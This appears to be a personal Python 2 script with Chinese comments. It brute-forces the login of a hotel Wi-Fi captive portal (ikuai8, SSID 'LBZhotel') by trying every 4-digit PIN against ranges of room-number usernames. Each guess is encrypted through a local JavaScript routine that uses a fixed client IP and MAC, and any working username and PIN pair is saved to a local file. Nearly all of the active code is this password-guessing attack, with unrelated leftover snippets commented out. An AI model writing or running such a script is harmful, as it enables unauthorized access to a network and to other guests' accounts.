#!/usr/bin/python
# -*- coding: UTF-8 -*-

import csv
import sys
import codecs

if sys.getdefaultencoding() != 'utf-8':
    reload(sys)
    sys.setdefaultencoding('utf-8')

# 打开文件，追加a
# 设定写入模式
# csvfile = file('D:\\weibo_result.csv', 'wb')
# csvfile.write(codecs.BOM_UTF8)
# writer = csv.writer(csvfile)
# writer.writerow(['姓名', '年龄', '电话'])
# writer.writerow(['张三','27','027-88888888'])

import requests

# # 这是一个图片的url
# url = 'http://ww4.sinaimg.cn/square/6a7775d5gy1frd6ctuk91j20v90kutfh.jpg'
# response = requests.get(url)
# # 获取的文本实际上是图片的二进制文本
# img = response.content
# # 将他拷贝到本地文件 w 写  b 二进制  wb代表写入二进制文本
# with open( 'D:\\a.jpg','wb' ) as f:
#     f.write(img)

# notContains=['a','e','i','o','u'];
#
# code="mdma";
# if code[0]  in notContains or code[2] in notContains:
#     print code
# /usr/bin/python
# encoding: utf-8

# import os
# os.system(r'C:\"Program Files (x86)"\"Google"\"Chrome"\"Application"\chrome.exe')

import time
# from selenium import webdriver
# driver = webdriver.Firefox()
# driver.get("http://www.baidu.com")
# driver.find_element_by_id("kw").send_keys("testing")
# driver.find_element_by_id("su").click()
# driver.quit()

import execjs
import requests


# 执行本地的js

def get_js():
    # f = open("D:/WorkSpace/MyWorkSpace/jsdemo/js/des_rsa.js",'r',encoding='UTF-8')
    f = open("D:\\des_rsa.js", 'r')
    line = f.readline()
    htmlstr = ''
    while line:
        htmlstr = htmlstr + line
        line = f.readline()
    return htmlstr


def getPassword(numbers):
    jsstr = get_js()
    ctx = execjs.compile(jsstr)
    password = (str(ctx.call('getValues', str(numbers), '192.168.255.201', '74:c6:3b:12:1f:2b')))
    print password
    return password


def login(username, password):
    print "login当前密码：", password
    url = 'http://portal.ikuai8.com/Action/webauth-up?type=1&action=release&username=' + str(
        username) + '&password=' + str(password) + '&refer='
    print "请求地址url：", url
    headers = {
        'Host': 'portal.ikuai8.com',
        # 'Referer': 'http://portal.ikuai8.com/templates/custom/user.html?type=1&_r=400389761&terminal=pc&template=custom&gwid=d9835d80160fb7e9f0032f9f37960041&router_ver=2.7.12&mac=74:c6:3b:12:1f:2b&user_ip=192.168.255.201&timestamp=1529809804&apmac=40:a5:ef:99:ff:d4&bssid=40:a5:ef:99:ff:d5&ssid=LBZhotel&firmware=IK-RouterOS&refer=',
        'Referer': 'http://portal.ikuai8.com/templates/custom/user.html?type=1&_r=450562091&terminal=pc&template=custom&gwid=d9835d80160fb7e9f0032f9f37960041&user_ip=192.168.255.201&mac=74:c6:3b:12:1f:2b&router_ver=2.7.12&timestamp=1531924832&apmac=40:a5:ef:99:ff:d4&bssid=40:a5:ef:99:ff:d5&ssid=LBZhotel&firmware=IK-RouterOS&refer=',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'
    }
    try:
        response = requests.get(url=url, timeout=100, headers=headers, allow_redirects=False)
        result = str(response.headers['Location'])
        print result
        return result.__contains__('success')
    except Exception,e:
        return False


def work(username):
    for i in range(1000, 9999):
        print "当前密码（明文）", i
        password = getPassword(i)
        print "加密后密码：", password
        result = login(username, password)
        if result:
            print "找到了密码：", i
            break
    print "程序运行完，未找到密码"


def work(username, flag):
    for i in range(0, 1000):
        pwd = '';
        for j in range(0, 4 - len(str(i))):
            pwd += '0';
        pwd += str(i);
        print "当前密码（明文）", pwd
        password = getPassword(pwd)
        print "加密后密码：", password
        result = login(username, password)
        if result:
            print "找到了密码：", pwd
            return

    for i in range(1000, 9999):
        print "当前密码（明文）", i
        password = getPassword(i)
        print "加密后密码：", password
        result = login(username, password)
        if result:
            print "找到了密码：", i
            break

    print "程序运行完，未找到密码"


def job():
    # for i in range(356, 1000):
    #     pwd = '';
    #     for j in range(0, 4 - len(str(i))):
    #         pwd += '0';
    #     pwd += str(i);
    #     print "当前密码（明文）", pwd
    #     password = getPassword(pwd)
    #     print "加密后密码：", password
    #
    #     for username in range(201, 241):
    #         result = login(str(username), password)
    #         if result:
    #             with open("D:\\password.txt", 'w') as f:
    #                 f.writelines([str(username) + "----" + pwd + "\n"])
    #             f.close()
    # print "0---1000未发现密码"
    for i in range(8581, 9999):
        print "当前密码（明文）", i
        password = getPassword(i)
        print "加密后密码：", password

        for username in range(201, 241):
            result = login(str(username), password)
            if result:
                try:
                    with open("D:\\password.txt", 'w') as f:
                        f.writelines([str(username) + "----" + str(i) + "\n"])
                    f.close()
                except:
                    continue

    for i in range(1000, 9999):
        print "当前密码（明文）", i
        password = getPassword(i)
        print "加密后密码：", password

        for username in range(8301, 8350):
            result = login(str(username), password)
            if result:
                try:
                    with open("D:\\password.txt", 'w') as f:
                        f.writelines([str(username) + "----" + str(i) + "\n"])
                    f.close()
                except:
                    continue

    print "程序运行完，未找到密码"


def test():
    username = 239
    password = 2221
    password = getPassword(password)
    result = login(username, password)
    if result:
        print "success"
        with open("D:\\password.txt", 'w') as f:
            f.writelines([str(username) + "----" + str(2221) + "\n"])
        f.close()


if __name__ == '__main__':
    # print login(236,1000)
    # work(236)
    # work(238, 1)
    # getPassword(1000)
    job()   #跑到了   6494
    # test()
